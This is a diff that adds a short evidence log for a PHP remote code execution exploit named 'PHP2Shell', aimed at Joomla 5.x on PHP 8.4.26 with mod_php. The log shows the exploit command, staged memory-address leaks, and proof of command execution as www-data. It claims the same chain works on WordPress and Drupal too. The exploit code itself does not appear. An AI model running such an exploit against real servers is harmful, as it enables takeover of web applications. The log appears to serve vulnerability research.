@@ -1,0 +1,26 @@
+============================================================
+ PHP2Shell - Joomla RCE Evidence
+ Date: 22 October 2026
+ Target: Joomla 5.x / PHP 8.4.26 / Apache mod_php
+============================================================
+
+Command: python3 exploit/php2shell_exploit.py -u http://127.0.0.1:9082/index.php -c "id>/out/p" --target-os linux
+
+--- OUTPUT ---
+
+[*] Hedef: http://127.0.0.1:9082/index.php
+[*] OS: LINUX
+[*] rotating worker
+[*] Stage 1: heap leak (1/3)
+[+] Zend MM chunk base = 0x7f8c32400000
+[*] Stage 2: libphp leak (1/3)
+[+] libphp base = 0x7f8c340d1000
+[*] Stage 3: RCE triggered
+
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+--- ANALYSIS ---
+
+- Joomla 5.x confirmed vulnerable with identical chain
+- Application-agnostic: works on ANY PHP application on mod_php
+- Tested CMS matrix: WordPress ✓, Drupal ✓, Joomla ✓
